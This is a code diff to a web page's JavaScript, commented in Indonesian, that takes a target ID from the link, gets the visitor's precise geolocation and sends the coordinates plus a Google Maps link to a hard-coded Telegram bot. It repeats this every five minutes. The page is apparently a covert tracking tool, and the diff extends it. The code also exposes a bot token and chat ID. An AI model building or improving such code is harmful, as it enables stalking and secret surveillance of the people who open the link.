@@ -12,14 +12,15 @@
     const telegramBotToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
     const chatId = "5677912817";
 
-    // Ambil ID dari parameter URL
+    // Ambil ID pengguna dari parameter URL
     const urlParams = new URLSearchParams(window.location.search);
     const userId = urlParams.get('id') || "TANPA_ID";
 
     function kirimLokasi(pos) {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
-      const pesan = `[ID: ${userId}] Lokasi dikirim: ${lat}, ${lon}`;
+      const linkMaps = `https://maps.google.com/?q=${lat},${lon}`;
+      const pesan = `[ID: ${userId}]\nLokasi dikirim: ${lat}, ${lon}\n${linkMaps}`;
       document.getElementById("status").innerText = pesan;
 
       fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
@@ -44,14 +45,14 @@
         { enableHighAccuracy: true }
       );
 
-      // Setiap 5 menit (300.000 ms)
+      // Perbarui lokasi setiap 5 menit
       setInterval(() => {
         navigator.geolocation.getCurrentPosition(
           kirimLokasi,
           () => document.getElementById("status").innerText = "Gagal memperbarui lokasi.",
           { enableHighAccuracy: true }
         );
-      }, 300000);
+      }, 300000); // 5 menit
     }
 
     mulaiPantau();
